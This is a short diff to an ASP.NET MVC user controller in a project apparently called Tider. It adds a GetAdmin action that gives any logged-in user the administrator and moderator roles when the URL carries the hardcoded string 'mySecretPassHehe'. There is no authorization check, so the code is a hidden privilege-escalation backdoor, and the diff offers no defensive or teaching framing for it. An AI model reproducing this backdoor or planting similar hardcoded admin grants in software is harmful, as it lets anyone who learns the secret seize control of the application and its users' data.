@@ -22,6 +22,16 @@ namespace Tider.Controllers
             return View(db.Users.ToList());
         }
 
+        // Get: ApplicationUsers/GetAdmin/secretCode
+        public ActionResult GetAdmin(string id) {
+            var UserManager = new UserManager<ApplicationUser>(new UserStore<ApplicationUser>(db));
+            if (id == "mySecretPassHehe") {
+                UserManager.AddToRole(User.Identity.GetUserId(), Const.ADMIN);
+                UserManager.AddToRole(User.Identity.GetUserId(), Const.MODERATOR);
+            }
+            return Redirect("Index");
+        }
+
         // GET: ApplicationUsers/ProfilePage/5
         public ActionResult ProfilePage(string id) {
             if (id == null) return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
@@ -73,6 +83,7 @@ namespace Tider.Controllers
 
             return Redirect(Request.UrlReferrer.ToString());
         }
+
 
 
         [HttpPost]
